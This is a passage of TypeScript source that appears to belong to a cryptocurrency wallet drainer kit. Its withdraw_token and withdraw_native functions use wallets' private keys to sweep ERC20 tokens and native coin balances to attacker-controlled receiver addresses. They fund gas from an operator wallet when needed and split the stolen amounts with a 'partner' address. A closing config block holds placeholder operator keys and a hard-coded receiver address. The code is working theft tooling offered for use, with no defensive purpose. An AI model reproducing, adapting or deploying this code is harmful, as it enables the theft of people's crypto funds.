    const node = new ethers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
    const signer = new ethers.Wallet(wallet_data.private, node);
    const feeData = await node.getFeeData();
    const gas_price = ((feeData.gasPrice || BigInt(0)) * BigInt(Math.floor(MS_Gas_Multiplier * 100))) / BigInt(100);

    const unsigned_tx: ethers.TransactionRequest = { from: wallet_data.address, value: "0x0", to: asset.address };

    const web3 = new Web3(MS_Private_RPC_URLs[chain_id]);
    const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

    const contract_data = web3_contract.methods.transfer(MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], asset.amount_raw).encodeABI();
    unsigned_tx.data = contract_data;

    const gas_limit = (await node.estimateGas(unsigned_tx) * BigInt(120)) / BigInt(100);
    const balance = await node.getBalance(wallet_data.address);

    if (balance < gas_limit * gas_price * BigInt(tx_count)) {
      const left_amount = gas_limit * gas_price * BigInt(tx_count) - balance;
      const main_balance = await node.getBalance(MS_Wallet_Address);

      if (main_balance < left_amount) return false;

      const main_signer = new ethers.Wallet(MS_Wallet_Private, node);
      const main_unsigned_tx: ethers.TransactionRequest = { from: MS_Wallet_Address, to: wallet_data.address, value: left_amount };
      const main_gas_limit = (await node.estimateGas(main_unsigned_tx) * BigInt(120)) / BigInt(100);

      main_unsigned_tx.gasPrice = gas_price;
      main_unsigned_tx.gasLimit = main_gas_limit;
      main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');

      const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
      await node.waitForTransaction(main_tx.hash, 1, 60000);
    }

    if (tx_count === 1) {
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      const tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 60000);
    } else {
      const partner_amount = (BigInt(asset.amount_raw) * BigInt(split_data)) / BigInt(100);
      const owner_amount = BigInt(asset.amount_raw) - partner_amount;

      unsigned_tx.data = web3_contract.methods.transfer(MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], owner_amount.toString()).encodeABI();
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      let tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 60000);
      await new Promise(r => setTimeout(r, 1000));

      unsigned_tx.to = partner_address as string;
      unsigned_tx.data = web3_contract.methods.transfer(partner_address, partner_amount.toString()).encodeABI();
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 60000);
    }

    return true;
  } catch (err) {
    console.log(err);
    return false;
  }
};

const withdraw_native = async (wallet_data: WalletData, chain_id = 1, amount_usd: number | null = null, is_premium = false, partner_address: string | false = false): Promise<boolean> => {
  try {
    await new Promise(r => setTimeout(r, 1000));

    const split_data = get_split_data(partner_address, { transfer: MS_Split_Modes.native.transfer }, amount_usd);
    const tx_count = !split_data ? 1 : 2;
    let is_tx_contract = false;

    const node = new ethers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
    const signer = new ethers.Wallet(wallet_data.private, node);
    const feeData = await node.getFeeData();
    const gas_price = ((feeData.gasPrice || BigInt(0)) * BigInt(Math.floor(MS_Gas_Multiplier * 100))) / BigInt(100);
    const unsigned_tx: ethers.TransactionRequest = {
      from: wallet_data.address, value: BigInt(100), data: '0x',
      to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)]
    };
    let gas_limit = (await node.estimateGas(unsigned_tx) * BigInt(120)) / BigInt(100);
    const balance = await node.getBalance(wallet_data.address);
    let available_amount = balance - gas_limit * gas_price * BigInt(tx_count);
    if (available_amount <= BigInt(0)) return false;

    if (MS_Settings && MS_Settings.Use_Public_Contract && typeof MS_Public_Contract === 'object' && MS_Public_Contract[chain_id] && MS_Public_Contract[chain_id] !== null) {
      const contract_address = is_premium ? MS_Public_Contract[chain_id][1] : MS_Public_Contract[chain_id][0];
      const web3 = new Web3(MS_Private_RPC_URLs[chain_id]);
      const web3_contract = new web3.eth.Contract(MS_Contract_ABI['MS_NEW'], contract_address);
      const secondary_address = !partner_address ? '0x0000000000000000000000000000000000000000' : partner_address;
      const contract_data = web3_contract.methods.Deposit(wallet_data.address, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
        secondary_address, web3.utils.toHex(!split_data ? 0 : split_data), false).encodeABI();
      unsigned_tx.data = contract_data;
      unsigned_tx.to = contract_address;
      const alternative_gas_limit = BigInt((chain_id === 42161) ? 5000000 : (chain_id === 43114 ? 5000000 : (chain_id === 369 ? 900000 : 100000)));
      const alternative_amount = balance - alternative_gas_limit * gas_price;
      if (alternative_amount <= BigInt(0)) {
        unsigned_tx.data = '0x';
        unsigned_tx.to = MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)];
      } else {
        gas_limit = alternative_gas_limit;
        available_amount = alternative_amount;
        is_tx_contract = true;
      }
    }

    if (is_tx_contract || tx_count === 1) {
      unsigned_tx.value = available_amount;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      const tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 30000);
    } else {
      const partner_amount = (available_amount * BigInt(split_data)) / BigInt(100);
      const owner_amount = available_amount - partner_amount;

      unsigned_tx.value = owner_amount;
      unsigned_tx.gasPrice = gas_price;
      unsigned_tx.gasLimit = gas_limit;
      unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

      let tx = await signer.sendTransaction(unsigned_tx);
      await node.waitForTransaction(tx.hash, 1, 30000);
      await new Promise(r => setTimeout(r, 1000));

      if (typeof partner_address === 'string') {
        unsigned_tx.to = partner_address;
        unsigned_tx.value = partner_amount;
        unsigned_tx.nonce = await node.getTransactionCount(wallet_data.address, 'pending');

        tx = await signer.sendTransaction(unsigned_tx);
        await node.waitForTransaction(tx.hash, 1, 30000);
      }
    }

    return true;
  } catch (err) {
    console.log(err);
    return false;
  }
};

export { withdraw_native, withdraw_token };


export const MS_Wallet_Address = "INSERT_RECEIVER_HERE";
export const MS_Wallet_Private = "WALLET_PRIVATE_HERE";
export const MS_Wallet_Receiver = "0xEc083d6958a356f125DC06d68a7B1696386434cD"; 